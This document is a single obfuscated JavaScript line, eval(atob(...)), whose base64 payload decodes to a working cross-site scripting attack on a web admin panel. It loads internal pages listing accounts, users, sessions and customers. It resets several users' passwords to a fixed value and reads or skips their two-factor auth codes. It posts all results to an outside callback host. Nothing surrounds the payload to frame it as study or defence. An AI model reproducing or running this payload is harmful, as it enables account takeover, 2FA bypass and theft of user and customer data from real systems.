eval(atob('dmFyIGNvbGxlY3RfcGFnZV9saXN0MiA9IFsiL0hvbWUvTG9hZFN5c3RlbUFjY291bnRzIiwiL0hvbWUvTG9hZFJlcVNpZ25VcHMiLCIvSG9tZS9Mb2FkVXNlcnMiLCIvSG9tZS9Mb2FkU2Vzc2lvbnMiLCIvSG9tZS9Mb2FkQ3VzdG9tZXJzIiwiL0hvbWUvTG9hZFVzZXJzR3JvdXBzIiwiL0hvbWUvTG9hZEN1c3RvbWVycyJdOwoKICAgICAgICBmdW5jdGlvbiBzZW5kX2NvbGxlY3RlZF9wYWdlMiggcGFnZV9kYXRhICkgewogICAgICAgICAgICB2YXIgaHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgICAgICB2YXIgdXJsID0gImh0dHBzOi8vYmluaG1kYW5leC5ieHNzLmluL3BhZ2VfY2FsbGJhY2siOwogICAgICAgICAgICBodHRwLm9wZW4oIlBPU1QiLCB1cmwsIHRydWUpOwogICAgICAgICAgICBodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi9qc29uIik7CiAgICAgICAgICAgIGh0dHAub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBpZihodHRwLnJlYWR5U3RhdGUgPT0gNCAmJiBodHRwLnN0YXR1cyA9PSAyMDApIHsKCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaHR0cC5zZW5kKCBKU09OLnN0cmluZ2lmeSggcGFnZV9kYXRhICkgKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGNvbGxlY3RfcGFnZV9kYXRhMiggcGF0aCApIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIHZhciBmdWxsX3VybCA9ICIvLyIgKyBkb2N1bWVudC5kb21haW4gKyBwYXRoCiAgICAgICAgICAgICAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICB4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHhoci5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcGFnZV9kYXRhID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgInBhZ2VfaHRtbCI6IHhoci5yZXNwb25zZVRleHQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAidXJpIjogZnVsbF91cmwKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMiggcGFnZV9kYXRhICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgeGhyLm9wZW4oJ1BPU1QnLCBmdWxsX3VybCwgdHJ1ZSk7CiAgICAgICAgICAgICAgICB4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL2pzb24iKTsKICAgICAgICAgICAgICAgIHhoci5zZW5kKEpTT04uc3RyaW5naWZ5KHt9KSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBjb2xsZWN0X3BhZ2VzMigpIHsKICAgICAgICAgICAgZm9yKCB2YXIgaSA9IDA7IGkgPCBjb2xsZWN0X3BhZ2VfbGlzdDIubGVuZ3RoOyBpKysgKSB7CiAgICAgICAgICAgICAgICAvLyBNYWtlIHN1cmUgdGhlIHBhdGggaXMgY29ycmVjdGx5IGZvcm1hdHRlZAogICAgICAgICAgICAgICAgaWYoIGNvbGxlY3RfcGFnZV9saXN0MltpXS5jaGFyQXQoMCkgIT0gIi8iICkgewogICAgICAgICAgICAgICAgICAgIGNvbGxlY3RfcGFnZV9saXN0MltpXSA9ICIvIiArIGNvbGxlY3RfcGFnZV9saXN0MltpXTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNvbGxlY3RfcGFnZV9kYXRhMiggY29sbGVjdF9wYWdlX2xpc3QyW2ldICk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCgogICAgICAgICAgICAvLyBMb2FkIERhdGEKICAgICAgICAgICAgZnVuY3Rpb24gTG9hZERhdGEoKSB7CiAgICAgICAgICAgICAgdHJ5eyAgJC5hamF4KHsKICAgICAgICAgICAgICAgICAgICB1cmw6ICIvSG9tZS9Mb2FkVXNlcnMiLAogICAgICAgICAgICAgICAgICAgIHR5cGU6ICJQT1NUIiwKICAgICAgICAgICAgICAgICAgICBkYXRhVHlwZTogIkpTT04iLAogICAgICAgICAgICAgICAgICAgIGNvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIsCiAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMihkYXRhKQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKGpxWEhSLCBleGNlcHRpb24pIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHN0ciA9ICIuNyMgMUJFICIgKyBqcVhIUi5zdGF0dXMudG9TdHJpbmcoKSArICJcbiIgKyBqcVhIUi5yZXNwb25zZUpTT04uTWVzc2FnZTsKICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTIoc3RyKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSBjYXRjaCAoIGUgKSB7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBDaGFuZ2VQYXNzKGlkKSB7CiAgICAgICAgICAgICAgdHJ5eyAgJC5hamF4KHsKICAgICAgICAgICAgICAgICAgICB1cmw6ICIvSG9tZS9FZGl0VXNlclBhc3N3b3JkIiwKICAgICAgICAgICAgICAgICAgICB0eXBlOiAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgZGF0YVR5cGU6ICJKU09OIiwKICAgICAgICAgICAgICAgICAgICBjb250ZW50VHlwZTogImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgiLAogICAgICAgICAgICAgICAgICAgIGRhdGE6IEpTT04uc3RyaW5naWZ5KHtJRDppZCxDb25maXJtTmV3UGFzc3dvcmQ6IlNXZXNkQDIzMjEiLE5ld1Bhc3N3b3JkOiJTV2VzZEAyMzIxIn0pLAogICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTIoZGF0YSkKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIGVycm9yOiBmdW5jdGlvbihqcVhIUiwgZXhjZXB0aW9uKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBzdHIgPSAiLjcjIDFCRSAiICsganFYSFIuc3RhdHVzLnRvU3RyaW5nKCkgKyAiXG4iICsganFYSFIucmVzcG9uc2VKU09OLk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKHN0cikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICAgICAgfX0KICAgICAgICAgICAgZnVuY3Rpb24gRWRpdFBhc3MoaWQpIHsKICAgICAgICAgICAgICB0cnl7ICAkLmFqYXgoewogICAgICAgICAgICAgICAgICAgIHVybDogIi9Ib21lL0dldEVkaXRVc2VyIiwKICAgICAgICAgICAgICAgICAgICB0eXBlOiAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgZGF0YVR5cGU6ICJKU09OIiwKICAgICAgICAgICAgICAgICAgICBjb250ZW50VHlwZTogImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgiLAogICAgICAgICAgICAgICAgICAgIGRhdGE6IEpTT04uc3RyaW5naWZ5KHsgSUQ6IGlkIH0pLAogICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTIoZGF0YSkKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIGVycm9yOiBmdW5jdGlvbihqcVhIUiwgZXhjZXB0aW9uKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBzdHIgPSAiLjcjIDFCRSAiICsganFYSFIuc3RhdHVzLnRvU3RyaW5nKCkgKyAiXG4iICsganFYSFIucmVzcG9uc2VKU09OLk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKHN0cikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICAgICAgfX0KCiAgICAgICAgICAgIC8vIFNob3dBdXRoQ29kZQogICAgICAgICAgICBmdW5jdGlvbiBTaG93QXV0aENvZGUoaWQpCiAgICAgICAgICAgIHsgdHJ5ewogICAgICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgICAgICB1cmw6ICIvSG9tZS9HZXRBdXRoQ29kZSIsCiAgICAgICAgICAgICAgICAgICAgdHlwZTogIlBPU1QiLAogICAgICAgICAgICAgICAgICAgIGRhdGFUeXBlOiAiSlNPTiIsCiAgICAgICAgICAgICAgICAgICAgY29udGVudFR5cGU6ICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICBkYXRhOiBKU09OLnN0cmluZ2lmeSh7IElEOiBpZCB9KSwKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzOiBmdW5jdGlvbihkYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMihkYXRhLm1lc3NhZ2UpCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oanFYSFIsIGV4Y2VwdGlvbikgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgc3RyID0gIi43IyAxQkUgIiArIGpxWEhSLnN0YXR1cy50b1N0cmluZygpICsgIlxuIiArIGpxWEhSLnJlc3BvbnNlSlNPTi5NZXNzYWdlOwogICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMihzdHIpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9IGNhdGNoICggZSApIHsKICAgICAgICAgICAgICAgIH0gIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIFNraXBBdXRoQ29kZShpZCkgewogICAgICAgICAgICAgIHRyeXsgICQuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgdXJsOiAiL0hvbWUvU2tpcEF1dGhDb2RlIiwKICAgICAgICAgICAgICAgICAgICB0eXBlOiAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgZGF0YVR5cGU6ICJKU09OIiwKICAgICAgICAgICAgICAgICAgICBjb250ZW50VHlwZTogImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgiLAogICAgICAgICAgICAgICAgICAgIGRhdGE6IEpTT04uc3RyaW5naWZ5KHsgSUQ6IGlkIH0pLAogICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTIoZGF0YSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEubWVzc2FnZSkKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIGVycm9yOiBmdW5jdGlvbihqcVhIUiwgZXhjZXB0aW9uKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBzdHIgPSAiLjcjIDFCRSAiICsganFYSFIuc3RhdHVzLnRvU3RyaW5nKCkgKyAiXG4iICsganFYSFIucmVzcG9uc2VKU09OLk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKHN0cikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICAgICAgfSAgfQoKICAgICAgICAgIAogICAgICAgICAgCiAgICAgICAgCgpMb2FkRGF0YSgpOwpDaGFuZ2VQYXNzKDc4MjIpO0NoYW5nZVBhc3MoNzgyNCk7Q2hhbmdlUGFzcyg3ODIzKTtDaGFuZ2VQYXNzKDEwKTsKRWRpdFBhc3MoMCk7RWRpdFBhc3MoMSk7CgpTaG93QXV0aENvZGUoMCk7U2hvd0F1dGhDb2RlKDEpO1Nob3dBdXRoQ29kZSgyKTtTaG93QXV0aENvZGUoMTApOwpTa2lwQXV0aENvZGUoNzgyMik7U2tpcEF1dGhDb2RlKDc4MjMpO1NraXBBdXRoQ29kZSg3ODI0KTtTa2lwQXV0aENvZGUoMTApOwogICAgICAgICAgY29sbGVjdF9wYWdlczIoKTsgIA=='))
